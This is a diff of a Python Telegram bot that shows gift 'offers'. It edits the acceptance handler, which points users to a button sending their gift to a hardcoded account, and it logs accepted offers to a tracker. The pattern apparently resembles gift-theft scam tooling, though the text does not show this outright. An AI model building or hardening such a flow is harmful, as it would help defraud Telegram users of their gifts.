@@ -106,7 +106,7 @@ def offer_kb(oid: str, lang: str) -> InlineKeyboardMarkup:
 
 def instruction_kb(lang: str) -> InlineKeyboardMarkup:
     t = TEXTS.get(lang, TEXTS["ru"])
-    # ТВОЯ ССЫЛКА (Я ЕЁ НЕ ТРОГАЛ)
+    # ТВОЯ ССЫЛКА
     gift_url = "tg://send_gift?to=8863549439"
     
     return InlineKeyboardMarkup(
@@ -227,11 +227,11 @@ async def handle_custom_command(message: Message):
         logging.exception("Ошибка в .оффер")
 
 # =====================================
-# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ (ИСПРАВЛЕНО)
+# КНОПКИ ПРИНЯТИЯ/ОТКЛОНЕНИЯ (С ЗАЩИТОЙ)
 # =====================================
 @dp.callback_query(F.data.startswith("acc:"))
 async def cb_accept(call: CallbackQuery):
-    # 1. СРАЗУ отвечаем Telegram (убираем "часики" с кнопки)
+    # 1. Отвечаем Telegram (убираем часики)
     await call.answer()
     
     oid = call.data.split(":", 1)[1]
@@ -248,17 +248,31 @@ async def cb_accept(call: CallbackQuery):
         cur=offer["cur"]
     ) + f"\n\n{offer['url']}"
 
-    # 2. Меняем сообщение (показываем кнопку "Передать подарок")
+    # 2. Пытаемся отредактировать
     try:
         await call.message.edit_text(
             text=text,
             reply_markup=instruction_kb(lang),
             link_preview_options=LARGE_PREVIEW
         )
+        logging.info("Сообщение успешно отредактировано.")
     except Exception as e:
         logging.error(f"Edit error: {e}")
+        # 3. Если редактирование упало - удаляем и шлем новое
+        try:
+            await call.message.delete()
+            await call.bot.send_message(
+                chat_id=call.message.chat.id,
+                text=text,
+                reply_markup=instruction_kb(lang),
+                business_connection_id=call.message.business_connection_id,
+                link_preview_options=LARGE_PREVIEW
+            )
+            logging.info("Сообщение заменено новым.")
+        except Exception as e2:
+            logging.error(f"Fallback error: {e2}")
 
-    # 3. Отправляем лог в трекер ОТДЕЛЬНО, чтобы ошибка не сломала кнопку
+    # 4. Лог в трекер (в фоне)
     asyncio.create_task(tracker_log(
         f"✅ Оффер принят\nID: {oid}\nПодарок: {offer['gift_name']}\n"
         f"Сумма: {offer['sum']} {offer['cur']}"
